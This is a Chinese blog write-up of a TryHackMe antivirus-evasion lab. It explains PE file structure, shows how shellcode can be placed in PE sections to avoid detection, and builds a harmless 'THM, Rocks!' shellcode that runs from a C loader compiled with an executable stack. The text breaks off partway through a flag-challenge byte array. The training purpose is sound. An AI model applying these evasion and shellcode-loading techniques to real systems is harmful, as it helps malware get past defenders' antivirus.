<p>在与本文相关的实验环境中，THM为我们提供了一台带有Web应用程序的目标Windows计算机，以便我们上传有效载荷(Payload)，在完成Payload上传之后，会由反病毒软件对Payload进行检查，如果没有检测到恶意软件那么Payload就会被成功执行，反之则无法执行。</p>
<p>我们的最终操作目标是规避目标虚拟机上已安装的反病毒软件的检测，从而尝试捕获目标文件系统中的flag内容，在最终测试任务中，我们将使用本文所介绍的AV规避技术来构建Payload并将其上传至<code>http://MACHINE_IP/</code>页面(此页面的链接可在目标机器的桌面上找到)以供AV软件检查。</p>
<p>关于本文最终测试任务需要注意的要点：</p>
<ul>
<li>尝试结合使用本文所讨论的各种规避技术；</li>
<li>目标站点仅支持上传EXE文件；</li>
<li>一旦反病毒软件对已上传的文件进行扫描并且没有检测到恶意代码，那么该文件就会被执行，因此，如果AV规避成功的话，我们将能够收到一个反向shell。</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408052054604.png" alt></p>
<p>为了完成本文的所有实验目标，我们需要在与本文相关的THM实验房间中点击部署目标虚拟机，完成部署后我们就可以通过浏览器内置分页来直接访问Windows目标机器，如果我们想使用THM所提供的AttackBox来通过RDP访问目标虚拟机，我们就需要用到以下凭据：</p>
<ul>
<li>Username：<code>thm</code></li>
<li>Password：<code>Password321</code></li>
</ul>
<p>tips：THM所提供的AttackBox也需要我们部署，在此我们不建议使用AttackBox访问和操作目标Windows机器，因为我们在完成本文的普通实验任务与最终测试任务时，本身就需要用到AttackBox，分机器(AttackBox、目标机)进行操作会更加方便、有条理。</p>
<p>注意：与本文相关的最终实验任务将在我们完成对本文的AV规避技术的基础学习之后再进行，具体的实验操作将在本文的倒数第二小节内容中进行介绍。</p>
<p>目标Windows虚拟机的桌面截图：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408052054605.png" alt></p>
<p>tips：HxD下载链接-<a target="_blank" rel="noopener" href="https://mh-nexus.de/en/downloads.php?product=HxD20">https://mh-nexus.de/en/downloads.php?product=HxD20</a></p>
<h1 id="0x03-pe结构">0x03 PE结构</h1>
<p>本小节将重点介绍WIndows二进制文件的PE数据结构的一些高级基本元素。</p>
<h2 id="什么是pe">什么是PE</h2>
<p>Windows可执行文件格式，又名PE(Portable Executable-可移植可执行)，是一种保存文件所需信息的数据结构，也是一种在计算机磁盘上组织可执行文件代码的方法。Windows操作系统组件，例如Windows和DOS加载程序，可以将PE文件加载到内存中，并能根据在相关PE结构中找到的已解析的文件信息来执行该PE文件。</p>
<p>一般而言，Windows二进制文件(如EXE、DLL和目标代码文件)的默认文件结构都具有相同的PE结构，并且都适用于Windows操作系统的CPU架构(x86和x64)。</p>
<p>tips：目标代码文件是源代码文件通过编译器和汇编器处理后生成的中间文件；目标代码(Object code)是编译器或汇编器处理源代码之后所生成的代码，它一般由机器代码或接近于机器语言的代码组成，而目标文件(Object file)或目标代码文件即存放目标代码的计算机文件，它是一种二进制文件。</p>
<p>PE结构包含了用于保存有关二进制文件信息的各个部分，其中最重要的一个部分是PE标头，它包含元数据信息、指针以及指向内存中地址段的链接，另外一个部分则是数据节，它包括了一些容器，而这些容器又用于包含Windows加载程序运行program(程序)所需的信息，例如可执行代码、资源、库链接、数据变量等信息。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408052054606.png" alt></p>
<p>PE结构中有不同类型的数据容器，每种数据容器保存了不同的数据：</p>
<p>tisp：此处的数据容器指的是PE节。</p>
<ol>
<li>.text：此节会存储程序的实际代码；</li>
<li>.data：此节会保存已初始化和已定义的变量；</li>
<li>.bss：此节会保存未初始化的数据(未赋值的、已声明的变量)；</li>
<li>.rdata：此节会包含只读数据；</li>
<li>.edata：此节会包含可导出的对象和相关的表信息；</li>
<li>.idata：导入的对象和相关的表信息；</li>
<li>.reloc：映像重定位信息；</li>
<li>.rsrc：链接程序所使用的外部资源，如图像、图标、嵌入式二进制文件和清单文件，其中包含了关于程序版本、作者、公司和版权的所有信息。</li>
</ol>
<p>PE结构是一个庞大而复杂的主题，在本小节中，我们仅提供关于PE结构的高级概述，关于该主题，以下博客文章可供参考学习：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Hekeats-L/p/17847693.html">【THM】Windows Internals(Windows内部机制基础)-学习</a></li>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Hekeats-L/p/17997054">【THM】Dissecting PE Headers(剖析PE标头)-学习</a></li>
</ul>
<p>此外，我们还可以通过查看<a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/win32/debug/pe-format">关于Windows PE格式的官方文档</a>，来获得有关PE结构的更深入的详细信息。</p>
<p>当我们尝试查看PE文件的PE内容时，会看到一堆人类无法阅读的字节，这些PE内容所包含的是Windows加载程序(loader)在运行文件时所需的所有详细信息。</p>
<p>以下是Windows加载程序读取可执行二进制文件并将其作为进程运行的示例步骤：</p>
<ol>
<li>处理标头部分：解析DOS、Windows和可选标头以提供有关EXE文件的信息
<ul>
<li>magic字段值为"MZ"，它将告诉WIndows加载程序这是一个EXE文件。</li>
<li>文件签名。</li>
<li>文件是针对x86还是x64 CPU架构编译的。</li>
</ul>
</li>
<li>解析节表详细信息
<ul>
<li>文件所包含的PE节的数目。</li>
</ul>
</li>
<li>将文件内容映射到内存中
<ul>
<li>EntryPoint地址和ImageBase的偏移量。</li>
<li>RVA：相对虚拟地址(Relative Virtual Address)，和Imagebase相关的地址。</li>
</ul>
</li>
<li>将导入项、DLLs和其他对象加载到内存中。</li>
<li>定位EntryPoint地址并运行主执行函数。</li>
</ol>
<h2 id="为什么需要了解pe">为什么需要了解PE</h2>
<p>我们有多个原因需要了解PE，首先，因为我们想要进行加壳和脱壳，而加壳、脱壳技术要求我们去了解关于PE结构的详细信息。</p>
<p>另一个原因是AV软件和恶意软件分析人员会根据PE标头和其他PE节中的信息来分析EXE文件。因此，作为攻击者，为了创建或修改针对Windows机器的具有AV规避能力的恶意软件，我们需要了解Windows PE文件的结构以及恶意shellcode可以存储的位置。</p>
<p>我们可以通过定义和初始化shellcode变量的方式来控制在哪个数据节中存储shellcode，以下是一些示例，它们展示了如何在PE中存储shellcode：</p>
<ol>
<li>将shellcode定义为main函数中的局部变量，这会将其存储在.TEXT PE节中。</li>
<li>将shellcode定义为全局变量，这会将其存储在 .Data 节中。</li>
<li>将shellcode作为原始二进制文件存储在图标图像中并在代码中链接它，这会导致其显示在.rsrc数据节中。</li>
<li>我们可以添加一个自定义数据节来存储shellcode。</li>
</ol>
<h2 id="使用pe-bear工具">使用PE-Bear工具</h2>
<p>与本文相关的目标虚拟机是一台Windows机器，其中有解析PE文件和读取PE信息所需的工具，我们可以在目标虚拟机的桌面文件夹中找到一个<a target="_blank" rel="noopener" href="https://github.com/hasherezade/pe-bear">PE-Bear</a>软件的副本，它有助于我们检查可执行文件的PE结构：PE标头、PE节等。</p>
<p>PE-Bear可以为我们提供一个图形用户界面来显示所有与EXE文件相关的详细信息，如果想使用PE-Bear加载EXE文件以进行分析，请选择File -&gt; Load PEs(Ctrl+O)。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408052054607.png" alt></p>
<p>使用PE-Bear成功加载文件后，我们就可以看到相关的所有PE信息，下面的截图显示了已加载的文件的PE详细信息，包括了我们在上文中所讨论的PE标头和PE节。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408052054608.png" alt></p>
<p>现在是时候尝试一下了！加载<strong>thm-intro2PE.exe</strong>文件来回答以下问题。该文件位于以下位置：&nbsp;<code>c:\Tools\&nbsp;PE&nbsp;files\thm-intro2PE.exe</code>&nbsp;。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408052054609.png" alt></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408052054610.png" alt></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408052054611.png" alt></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408052054612.png" alt></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408052054614.png" alt></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408052054615.png" alt></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408052054616.png" alt></p>
<h1 id="0x04-shellcode介绍">0x04 Shellcode介绍</h1>
<p>Shellcode是一组精心设计的机器代码指令，它将告诉易受攻击的程序运行一些额外功能，并且在大多数情况下，它能够向攻击者提供针对目标系统的shell访问权限或者可以创建反向shell。</p>
<p>一旦shellcode被注入到进程中并由易受攻击的软件或程序执行，它就会修改正常的代码运行流程，从而更新程序的寄存器和函数以执行攻击者所构建的代码。</p>
<p>Shellcode一般用汇编语言编写并可转译为十六进制操作码(opcodes-operational codes)，编写独特的、自定义的shellcode有助于显著地规避反病毒软件，但是这并不是一件容易的事情，需要我们拥有出色的汇编语言知识和技能。</p>
<h2 id="一个简单的shellcode">一个简单的Shellcode</h2>
<p>为了编写自定义的shellcode，我们可能需要具备以下技能：</p>
<ul>
<li>对 x86 和 x64 CPU 架构有很好的了解。</li>
<li>掌握了良好的汇编语言知识。</li>
<li>对C语言等编程语言有丰富的了解。</li>
<li>熟悉Linux和Windows操作系统。</li>
</ul>
<p>为了生成我们自己的shellcode，我们需要编写并从汇编机器代码中提取字节，在本文实验环境中，我们可以使用AttackBox为Linux创建一个简单的Shellcode，用于写入字符串"THM, Rocks!"。我们可能会用到以下两个主要的函数：</p>
<ul>
<li>sys_write：系统写入函数，用于打印出我们所选择的字符串。</li>
<li>sys_exit：系统退出函数，用于终止程序的执行。</li>
</ul>
<p>为了调用上述两个函数，我们将使用syscalls(系统调用)，syscall是程序用于请求内核执行某些操作的方式，我们可以请求内核向屏幕写入一个字符串，然后退出程序。每个操作系统对于系统调用都有不同的调用约定，这意味着如果我们要在Linux中使用写入函数，就可能要使用与Windows系统中不同的系统调用。</p>
<p>对于64位Linux系统，我们可以通过设置以下值从内核调用所需的函数：</p>
<table>
<thead>
<tr>
<th><strong>rax</strong></th>
<th><strong>System Call</strong></th>
<th><strong>rdi</strong></th>
<th><strong>rsi</strong></th>
<th><strong>rdx</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>0x1</td>
<td>sys_write</td>
<td>unsigned int fd</td>
<td>const char *buf</td>
<td>size_t count</td>
</tr>
<tr>
<td>0x3c</td>
<td>sys_exit</td>
<td>int error_code</td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<p>上表告诉我们需要在不同处理器寄存器中设置哪些值才能使用syscalls调用sys_write和sys_exit函数。对于64位Linux，rax寄存器用于指示我们希望调用的内核中的函数。将rax设置为0x1将使内核执行sys_write，将rax设置为0x3c将使内核执行sys_exit，这两个函数都需要一些参数才能工作，这些参数可以通过rdi、rsi和rdx寄存器进行设置。</p>
<p>我们可以在以下链接中找到可用的64位Linux系统调用的完整参考：</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/">https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/</a></p>
</blockquote>
<p>对于<code>sys_write</code>，通过<code>rdi</code>发送的第一个参数是要写入的文件描述符，&nbsp;<code>rsi</code>中的第二个参数是指向我们要打印的字符串的指针，&nbsp;<code>rdx</code>中的第三个参数是要打印的字符串的大小。</p>
<p>对于<code>sys_exit</code>，<code>rdi</code>需要被设置为程序的退出代码，我们将使用代码0，这意味着程序成功退出。</p>
<p>我们可以将以下代码复制到AttackBox中名为<code>thm.asm</code>(使用vim命令创建)的文件中：</p>
<pre><code class="hljs c#"><span class="hljs-keyword">global</span> _start

section .text
_start:
    jmp MESSAGE      ; <span class="hljs-number">1</span>) <span class="hljs-keyword">let</span><span class="hljs-string">'s jump to MESSAGE</span>
<span class="hljs-string"></span>
<span class="hljs-string">GOBACK:</span>
<span class="hljs-string">    mov rax, 0x1</span>
<span class="hljs-string">    mov rdi, 0x1</span>
<span class="hljs-string">    pop rsi          ; 3) we are popping into `rsi`; now we have the</span>
<span class="hljs-string">                     ; address of "THM, Rocks!\r\n"</span>
<span class="hljs-string">    mov rdx, 0xd</span>
<span class="hljs-string">    syscall</span>
<span class="hljs-string"></span>
<span class="hljs-string">    mov rax, 0x3c</span>
<span class="hljs-string">    mov rdi, 0x0</span>
<span class="hljs-string">    syscall</span>
<span class="hljs-string"></span>
<span class="hljs-string">MESSAGE:</span>
<span class="hljs-string">    call GOBACK       ; 2) we are going back, since we used `call`, that means</span>
<span class="hljs-string">                      ; the return address, which is, in this case, the address</span>
<span class="hljs-string">                      ; of "THM, Rocks!\r\n", is pushed into the stack.</span>
<span class="hljs-string">    db "THM, Rocks!", 0dh, 0ah</span></code></pre>
<p>我们简单解释一下上述ASM(汇编)代码：首先，我们的消息字符串存储在.text节的末尾，由于我们需要一个指向该消息的指针来打印它，因此我们将跳转到消息本身之前的“调用指令”，当<code>call GOBACK</code>得到执行，该调用之后的下一条指令的地址将被压入堆栈，此地址对应于我们的消息所在的位置。</p>
<p>注意：在上述汇编代码中，消息末尾的0dh, 0ah相当于二进制文件中的换行符 (\r\n) 。</p>
<p>接下来，程序会启动GOBACK例行程序并为我们的第一个sys_write()函数准备所需的寄存器。</p>
<ul>
<li>我们通过在rax寄存器中设置0x1来指定sys_write函数；系统调用号1代表write。</li>
<li>我们将rdi设置为0x1以将字符串打印到用户控制台(STDOUT)；文件描述符1代表标准输出。</li>
<li>我们弹出一个指向字符串的指针(该指针是在调用GOBACK时被压入的)，并将其存储到rsi中。</li>
<li>将要写入的字节数(13)放入rdx寄存器。</li>
<li>执行syscall，使用准备好的值来执行sys_write函数，从而将 “THM, Rocks!\r\n” 打印到标准输出。</li>
<li>对于上述汇编代码中的剩余部分，我们会执行相同的操作来调用sys_exit函数，我们将0x3c(系统调用号60，代表exit)放入寄存器rax，将退出状态码0放入寄存器rdi，最后执行syscall来退出程序。</li>
</ul>
<p>现在，我们可以编译并链接ASM(汇编)代码，以创建x64 Linux可执行文件并最终执行这个程序。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408052054617.png" alt></p>
<p>如上所示，我们可以使用<code>nasm</code>命令编译asm文件，而&nbsp;<code>-f elf64</code>命令选项则表明我们正在为 64 位 Linux 进行编译处理。请注意，经过编译之后我们将得到一个以.o为结尾的文件，其中包含了目标代码，但是它还需要经过链接处理，以便成为一个有效的可执行文件。为此，我们可以使用<code>ld</code>命令将目标文件链接成可执行文件，其中<code>-o</code>&nbsp;命令选项可用于指定要输出的可执行文件的名称。</p>
<p>我们已经编译好了ASM程序，让我们使用<code>objdump</code>命令通过转储编译后的二进制文件的.text节来提取shellcode。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408052054618.png" alt></p>
<pre><code class="hljs c#"><span class="hljs-meta">#Dump the .text section</span>
user@AttackBox$ objdump -d thm

thm:     file format elf64-x86<span class="hljs-number">-64</span>


Disassembly of section .text:

<span class="hljs-number">0000000000401000</span> &lt;_start&gt;:
  <span class="hljs-number">401000</span>:       eb <span class="hljs-number">1</span>e                   jmp    <span class="hljs-number">401020</span> &lt;MESSAGE&gt;

<span class="hljs-number">0000000000401002</span> &lt;GOBACK&gt;:
  <span class="hljs-number">401002</span>:       b8 <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>          mov    $<span class="hljs-number">0x1</span>,%eax
  <span class="hljs-number">401007</span>:       bf <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>          mov    $<span class="hljs-number">0x1</span>,%edi
  <span class="hljs-number">40100</span>c:       <span class="hljs-number">5</span>e                      pop    %rsi
  <span class="hljs-number">40100</span>d:       ba <span class="hljs-number">0</span>d <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>          mov    $<span class="hljs-number">0xd</span>,%edx
  <span class="hljs-number">401012</span>:       <span class="hljs-number">0f</span> <span class="hljs-number">05</span>                   syscall
  <span class="hljs-number">401014</span>:       b8 <span class="hljs-number">3</span>c <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>          mov    $<span class="hljs-number">0x3c</span>,%eax
  <span class="hljs-number">401019</span>:       bf <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>          mov    $<span class="hljs-number">0x0</span>,%edi
  <span class="hljs-number">40101</span>e:       <span class="hljs-number">0f</span> <span class="hljs-number">05</span>                   syscall

<span class="hljs-number">0000000000401020</span> &lt;MESSAGE&gt;:
  <span class="hljs-number">401020</span>:       e8 dd ff ff ff          call   <span class="hljs-number">401002</span> &lt;GOBACK&gt;
  <span class="hljs-number">401025</span>:       <span class="hljs-number">54</span>                      push   %rsp
  <span class="hljs-number">401026</span>:       <span class="hljs-number">48</span>                      rex.W
  <span class="hljs-number">401027</span>:       <span class="hljs-number">4</span>d <span class="hljs-number">2</span>c <span class="hljs-number">20</span>                rex.WRB sub $<span class="hljs-number">0x20</span>,%al
  <span class="hljs-number">40102</span>a:       <span class="hljs-number">52</span>                      push   %rdx
  <span class="hljs-number">40102b</span>:       <span class="hljs-number">6f</span>                      outsl  %ds:(%rsi),(%dx)
  <span class="hljs-number">40102</span>c:       <span class="hljs-number">63</span> <span class="hljs-number">6b</span> <span class="hljs-number">73</span>                movsxd <span class="hljs-number">0x73</span>(%rbx),%ebp
  <span class="hljs-number">40102f</span>:       <span class="hljs-number">21</span>                      .<span class="hljs-built_in">byte</span> <span class="hljs-number">0x21</span>
  <span class="hljs-number">401030</span>:       <span class="hljs-number">0</span>d                      .<span class="hljs-built_in">byte</span> <span class="hljs-number">0xd</span>
  <span class="hljs-number">401031</span>:       <span class="hljs-number">0</span>a                      .<span class="hljs-built_in">byte</span> <span class="hljs-number">0xa</span></code></pre>
<p>我们需要从上面的输出中提取十六进制值，为此，我们可以先使用<code>objcopy</code>将<code>.text</code>节以二进制格式转储到名为<code>thm.text</code>的新文件中：</p>
<pre><code class="hljs scss"><span class="hljs-comment">// Extract the .text section</span>
user<span class="hljs-keyword">@AttackBox</span>$ objcopy -j .text -O binary thm thm.text</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408052054619.png" alt></p>
<p>我们得到的thm.text包含了二进制格式的shellcode，为了能够使用它，我们还需要将其转换为十六进制，我们可以使用<code>xxd -i</code>命令，这将直接以C字符串形式输出二进制文件的内容：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408052054620.png" alt></p>
<pre><code class="hljs scss"><span class="hljs-selector-id">#Output</span> the hex equivalent to our shellcode
user<span class="hljs-keyword">@AttackBox</span>$ xxd -i thm.text
unsigned char new_text[] = {
  <span class="hljs-number">0</span>xeb, <span class="hljs-number">0</span>x1e, <span class="hljs-number">0</span>xb8, <span class="hljs-number">0</span>x01, <span class="hljs-number">0</span>x00, <span class="hljs-number">0</span>x00, <span class="hljs-number">0</span>x00, <span class="hljs-number">0</span>xbf, <span class="hljs-number">0</span>x01, <span class="hljs-number">0</span>x00, <span class="hljs-number">0</span>x00, <span class="hljs-number">0</span>x00,
  <span class="hljs-number">0</span>x5e, <span class="hljs-number">0</span>xba, <span class="hljs-number">0</span>x0d, <span class="hljs-number">0</span>x00, <span class="hljs-number">0</span>x00, <span class="hljs-number">0</span>x00, <span class="hljs-number">0</span>x0f, <span class="hljs-number">0</span>x05, <span class="hljs-number">0</span>xb8, <span class="hljs-number">0</span>x3c, <span class="hljs-number">0</span>x00, <span class="hljs-number">0</span>x00,
  <span class="hljs-number">0</span>x00, <span class="hljs-number">0</span>xbf, <span class="hljs-number">0</span>x00, <span class="hljs-number">0</span>x00, <span class="hljs-number">0</span>x00, <span class="hljs-number">0</span>x00, <span class="hljs-number">0</span>x0f, <span class="hljs-number">0</span>x05, <span class="hljs-number">0</span>xe8, <span class="hljs-number">0</span>xdd, <span class="hljs-number">0</span>xff, <span class="hljs-number">0</span>xff,
  <span class="hljs-number">0</span>xff, <span class="hljs-number">0</span>x54, <span class="hljs-number">0</span>x48, <span class="hljs-number">0</span>x4d, <span class="hljs-number">0</span>x2c, <span class="hljs-number">0</span>x20, <span class="hljs-number">0</span>x52, <span class="hljs-number">0</span>x6f, <span class="hljs-number">0</span>x63, <span class="hljs-number">0</span>x6b, <span class="hljs-number">0</span>x73, <span class="hljs-number">0</span>x21,
  <span class="hljs-number">0</span>x0d, <span class="hljs-number">0</span>x0a
};
unsigned int new_text_len = <span class="hljs-number">50</span>;</code></pre>
<p>最后，我们得到了来自ASM程序集的格式化的shellcode。</p>
<p>为了确认已提取的shellcode是否会按照我们的预期进行工作，我们可以将Shellcode注入到C程序中并尝试进行执行。</p>
<pre><code class="hljs c"><span class="hljs-comment">//shell.c</span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>

<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span> {
    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> message[] = {
        <span class="hljs-number">0xeb</span>, <span class="hljs-number">0x1e</span>, <span class="hljs-number">0xb8</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xbf</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,
        <span class="hljs-number">0x5e</span>, <span class="hljs-number">0xba</span>, <span class="hljs-number">0x0d</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x0f</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0xb8</span>, <span class="hljs-number">0x3c</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,
        <span class="hljs-number">0x00</span>, <span class="hljs-number">0xbf</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x0f</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0xe8</span>, <span class="hljs-number">0xdd</span>, <span class="hljs-number">0xff</span>, <span class="hljs-number">0xff</span>,
        <span class="hljs-number">0xff</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x4d</span>, <span class="hljs-number">0x2c</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x6f</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x6b</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x21</span>,
        <span class="hljs-number">0x0d</span>, <span class="hljs-number">0x0a</span>
    };
    
    (*(<span class="hljs-type">void</span>(*)())message)();
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}</code></pre>
<pre><code class="hljs c#"><span class="hljs-meta">#Compiler our C program</span>
user@AttackBox$ gcc -g -Wall -z execstack thm.c -o thmx
user@AttackBox$ ./thmx
THM,Rocks!


<span class="hljs-meta">#gcc -g -Wall -z execstack thm.c -o thmx</span>
<span class="hljs-meta">#这是一个使用 `gcc` 编译器的命令，用于编译名为 "thm.c" 的 C 语言源代码文件，并生成一个可执行文件 "thmx"。</span>

<span class="hljs-meta">#下面是对每个参数的解释：</span>

<span class="hljs-meta">#- `gcc`: 是 GNU Compiler Collection（GNU 编译器集合）的缩写，用于编译 C/C++ 程序。</span>
<span class="hljs-meta">#- `-g`: 启用调试信息，这将在生成的可执行文件中包含调试信息，以便在调试过程中可以查看变量值、跟踪程序执行等。</span>
<span class="hljs-meta">#- `-Wall`: 启用所有警告选项，以便编译器能够检测并显示潜在的代码问题。</span>
<span class="hljs-meta">#- `-z execstack`: 允许可执行文件的堆栈上执行代码。这对于某些特定的应用场景可能是必需的，但在安全性方面需要谨慎使用。</span>
<span class="hljs-meta">#- `thm.c`: 源代码文件的名称，这里假设为 "thm.c"。</span>
<span class="hljs-meta">#- `-o thmx`: 指定输出可执行文件的名称为 "thmx"。</span>

<span class="hljs-meta">#综上所述，该命令将编译名为 "thm.c" 的 C 语言源代码文件，并生成一个名为 "thmx" 的可执行文件。</span></code></pre>
<blockquote>
<p>使用-z execstack参数将禁用 NX 保护，NX（No Execute）保护是一种针对硬件和操作系统的安全特性，它能防止内存中的数据被误认为是可执行代码而被执行。在默认情况下，操作系统会将堆栈设置为不可执行(NX)，以便提高系统的安全性。</p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408052054621.png" alt></p>
<p>如上所示，我们是通过禁用NX保护来编译C程序的，这可能会阻止我们在数据段或堆栈中正确执行代码。</p>
<p>了解shellcode及其创建方式至关重要，尤其是在处理shellcode加密和编码时。</p>
<p>修改您的 C 程序以执行以下 shellcode。旗帜是什么？</p>
<pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> message[] = {
  <span class="hljs-number">0xeb</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0xb9</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x5e</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xf0</span>, <span class="hljs-number">0x80</span>,
  <span class="hljs-number">0x34</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0xc1</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0xf9</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x75</span>,
